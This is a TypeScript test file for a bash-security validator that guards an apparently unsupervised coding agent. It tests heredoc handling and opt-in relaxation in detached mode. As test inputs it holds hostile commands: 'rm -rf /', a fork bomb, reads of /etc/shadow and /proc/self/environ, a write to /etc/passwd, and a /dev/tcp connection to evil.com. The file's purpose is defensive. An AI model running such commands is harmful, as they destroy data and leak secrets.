/**
 * Tests for bash security relaxation in detached mode.
 *
 * Three validators CAN be skipped in detached mode because they produce
 * false positives on legitimate SWE-bench commands:
 *   - validateNewlines (multi-line compound commands)
 *   - validateRedirections (file output redirections)
 *   - validateShellMetacharsInCommands (2>&1 | grep patterns)
 *
 * M10: this relaxation is OPT-IN. By default detached mode runs the SAME
 * validators as interactive mode — an unsupervised agent must not silently get
 * more latitude. Relaxation only happens when the caller explicitly passes
 * `relaxDetachedValidators: true`. All destructive-command guards remain active
 * in BOTH modes regardless of the flag.
 */

import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import { validateBashSecurity, stripHeredocBodies, detectNuclearCommand } from '../src/tools/bash-security';

const RELAX = { detachedMode: true, relaxDetachedValidators: true } as const;

// ---------------------------------------------------------------------------
// ui#26: the newline + redirect structural guards wrongly blocked LEGITIMATE
// heredocs (their body is inert stdin data, not command separation / redirects).
// These pass in interactive AND detached-default mode now; genuine command
// separation (cmd1\ncmd2) and real file redirects stay blocked; destructive
// content inside a heredoc body is still caught by the nuclear layer.
// ---------------------------------------------------------------------------
describe('ui#26 — heredocs are allowed, injection/destructive patterns are not', () => {
  const ALLOWED: Array<[string, string]> = [
    ['simple heredoc', 'cat <<EOF\nhello\nworld\nEOF'],
    ['quoted-delimiter python heredoc', "python3 - <<'PY'\nimport sys\nprint(sys.version)\nPY"],
    ['dash-form heredoc with indented close', 'cat <<-END\n\tfoo\n\tEND'],
    ['heredoc body containing angle brackets (HTML)', 'cat <<EOF\n<html><body>x</body></html>\nEOF'],
    ['heredoc with a pipe on the opening line', 'cat <<EOF | grep x\naaa\nxbbb\nEOF'],
  ];
  for (const [name, cmd] of ALLOWED) {
    it(`allows ${name} (interactive)`, () => {
      const r = validateBashSecurity(cmd);
      assert.equal(r.safe, true, `expected allow, got: ${r.message}`);
    });
    it(`allows ${name} (detached default, no opt-in)`, () => {
      const r = validateBashSecurity(cmd, { detachedMode: true });
      assert.equal(r.safe, true, `expected allow, got: ${r.message}`);
    });
  }

  it('STILL blocks genuine newline-separated commands (not a heredoc)', () => {
    assert.equal(validateBashSecurity('cd /repo && make build\n./run_tests.sh').safe, false);
  });
  it('STILL blocks a real file redirect on a heredoc opening line', () => {
    assert.equal(validateBashSecurity('cat <<EOF > /etc/passwd\nowned\nEOF').safe, false);
  });
  it('STILL blocks a plain output/input redirect', () => {
    assert.equal(validateBashSecurity('echo hi > /etc/passwd').safe, false);
    assert.equal(validateBashSecurity('cat < /etc/shadow').safe, false);
  });
  it('defense-in-depth: destructive content in a heredoc body is still caught by the nuclear guard', () => {
    // validateBashSecurity classifies structure; the bash tool runs detectNuclearCommand on the
    // RAW command first, so an executable heredoc (bash/sh/python) can never smuggle a nuke.
    assert.equal(detectNuclearCommand('bash <<EOF\nrm -rf /\nEOF').blocked, true);
    assert.equal(detectNuclearCommand('sh <<SH\n:(){ :|:& };:\nSH').blocked, true);
  });
});

describe('stripHeredocBodies (ui#26)', () => {
  it('removes the <<WORD operator and body, keeping the rest of the opening line', () => {
    assert.equal(stripHeredocBodies('cat <<EOF\nhi\nEOF'), 'cat   __HEREDOC__');
    assert.equal(stripHeredocBodies('cat <<EOF | grep x\na\nEOF'), 'cat   | grep x __HEREDOC__');
  });
  it('leaves a command with no heredoc untouched', () => {
    assert.equal(stripHeredocBodies('echo hello'), 'echo hello');
    assert.equal(stripHeredocBodies('cd a && b\nc'), 'cd a && b\nc');
  });
  it('leaves an unterminated heredoc as-is (still guarded by the newline check)', () => {
    const cmd = 'cat <<EOF\nno closing delimiter here';
    assert.equal(stripHeredocBodies(cmd), cmd);
    assert.equal(validateBashSecurity(cmd).safe, false);
  });
  it('does not treat a << with no delimiter line as a heredoc', () => {
    assert.equal(stripHeredocBodies('echo "<<EOF"'), 'echo "<<EOF"');
  });
});

describe('validateBashSecurity — detached mode relaxation (opt-in)', () => {
  // -----------------------------------------------------------------------
  // Commands ALLOWED only when relaxation is explicitly opted into
  // (detachedMode + relaxDetachedValidators), and blocked in interactive.
  // -----------------------------------------------------------------------

  it('allows grep with 2>&1 pipe when relaxation opted in', () => {
    const result = validateBashSecurity(
      'go test ./... 2>&1 | grep -v "no test"',
      RELAX,
    );
    assert.equal(result.safe, true, `Should be safe with opt-in relaxation, got: ${result.message}`);
  });

  it('allows file output redirection when relaxation opted in', () => {
    const result = validateBashSecurity(
      'go test ./... > /tmp/test-output.txt',
      RELAX,
    );
    assert.equal(result.safe, true, `Should be safe with opt-in relaxation, got: ${result.message}`);
  });

  it('allows stderr redirection to file when relaxation opted in', () => {
    const result = validateBashSecurity(
      'make build 2>/tmp/build-errors.log',
      RELAX,
    );
    assert.equal(result.safe, true, `Should be safe with opt-in relaxation, got: ${result.message}`);
  });

  it('allows multi-line compound command when relaxation opted in', () => {
    const result = validateBashSecurity(
      'cd /repo && make build\n./run_tests.sh',
      RELAX,
    );
    assert.equal(result.safe, true, `Should be safe with opt-in relaxation, got: ${result.message}`);
  });

  it('allows find with pipe and xargs when relaxation opted in', () => {
    const result = validateBashSecurity(
      'find . -name "*.go" -type f | xargs grep "func Test"',
      RELAX,
    );
    assert.equal(result.safe, true, `Should be safe with opt-in relaxation, got: ${result.message}`);
  });

  // -----------------------------------------------------------------------
  // M10: by DEFAULT (detachedMode only, no opt-in) these are now BLOCKED —
  // identical to interactive mode. This is the core safety change.
  // -----------------------------------------------------------------------

  it('blocks grep with 2>&1 pipe in detached mode by default (no opt-in)', () => {
    const result = validateBashSecurity(
      'go test ./... 2>&1 | grep -v "no test"',
      { detachedMode: true },
    );
    assert.equal(result.safe, false, 'detached must validate like interactive without opt-in');
  });

  it('blocks file output redirection in detached mode by default (no opt-in)', () => {
    const result = validateBashSecurity(
      'go test ./... > /tmp/test-output.txt',
      { detachedMode: true },
    );
    assert.equal(result.safe, false, 'detached must validate like interactive without opt-in');
  });

  it('blocks multi-line compound command in detached mode by default (no opt-in)', () => {
    const result = validateBashSecurity(
      'cd /repo && make build\n./run_tests.sh',
      { detachedMode: true },
    );
    assert.equal(result.safe, false, 'detached must validate like interactive without opt-in');
  });

  it('opt-in flag is inert without detachedMode (interactive stays strict)', () => {
    // relaxDetachedValidators only takes effect in detached mode.
    const result = validateBashSecurity(
      'go test ./... > /tmp/out.txt',
      { relaxDetachedValidators: true },
    );
    assert.equal(result.safe, false);
  });

  // -----------------------------------------------------------------------
  // Same commands BLOCKED in interactive mode (default)
  // -----------------------------------------------------------------------

  it('blocks grep with shell metachar in interactive mode', () => {
    const result = validateBashSecurity(
      'go test ./... 2>&1 | grep -v "no test"',
    );
    assert.equal(result.safe, false);
  });

  it('blocks file output redirection in interactive mode', () => {
    const result = validateBashSecurity(
      'go test ./... > /tmp/test-output.txt',
    );
    assert.equal(result.safe, false);
  });

  it('blocks multi-line compound command in interactive mode', () => {
    const result = validateBashSecurity(
      'cd /repo && make build\n./run_tests.sh',
    );
    assert.equal(result.safe, false);
  });

  // -----------------------------------------------------------------------
  // Dangerous patterns STILL BLOCKED even in detached mode
  // -----------------------------------------------------------------------

  it('still blocks IFS injection in detached mode', () => {
    const result = validateBashSecurity(
      'echo $IFS',
      { detachedMode: true },
    );
    assert.equal(result.safe, false);
  });

  it('still blocks control characters in detached mode', () => {
    const result = validateBashSecurity(
      'echo hello\x00world',
      { detachedMode: true },
    );
    assert.equal(result.safe, false);
  });

  it('still blocks proc environ access in detached mode', () => {
    const result = validateBashSecurity(
      'cat /proc/self/environ',
      { detachedMode: true },
    );
    assert.equal(result.safe, false);
  });

  it('still blocks command substitution injection in detached mode', () => {
    const result = validateBashSecurity(
      'echo $(rm -rf /)',
      { detachedMode: true },
    );
    assert.equal(result.safe, false);
  });

  it('still blocks backtick injection in detached mode', () => {
    const result = validateBashSecurity(
      'echo `rm -rf /`',
      { detachedMode: true },
    );
    assert.equal(result.safe, false);
  });

  // -----------------------------------------------------------------------
  // Destructive-command guards STILL BLOCK even when relaxation is opted in.
  // The opt-in flag must never weaken these guards.
  // -----------------------------------------------------------------------

  for (const mode of [
    { name: 'interactive', opts: undefined as undefined | Record<string, boolean> },
    { name: 'detached (default)', opts: { detachedMode: true } },
    { name: 'detached (relaxed opt-in)', opts: { detachedMode: true, relaxDetachedValidators: true } },
  ]) {
    it(`blocks command-substitution rm -rf in ${mode.name} mode`, () => {
      const result = validateBashSecurity('echo $(rm -rf /)', mode.opts);
      assert.equal(result.safe, false, 'command substitution guard must hold');
    });

    it(`blocks /dev/tcp network redirect in ${mode.name} mode`, () => {
      const result = validateBashSecurity('cat < /dev/tcp/evil.com/443', mode.opts);
      assert.equal(result.safe, false, '/dev/tcp guard must hold');
    });

    it(`blocks IFS injection in ${mode.name} mode`, () => {
      const result = validateBashSecurity('echo $IFS', mode.opts);
      assert.equal(result.safe, false, 'IFS guard must hold');
    });
  }

  // -----------------------------------------------------------------------
  // Signature backward-compatibility: no options arg = interactive mode
  // -----------------------------------------------------------------------

  it('works without options parameter (backward compatible)', () => {
    const result = validateBashSecurity('echo hello');
    assert.equal(result.safe, true);
  });

  it('works with empty options object', () => {
    const result = validateBashSecurity('echo hello', {});
    assert.equal(result.safe, true);
  });

  it('works with detachedMode: false (same as interactive)', () => {
    const result = validateBashSecurity(
      'go test ./... > /tmp/out.txt',
      { detachedMode: false },
    );
    assert.equal(result.safe, false);
  });
});
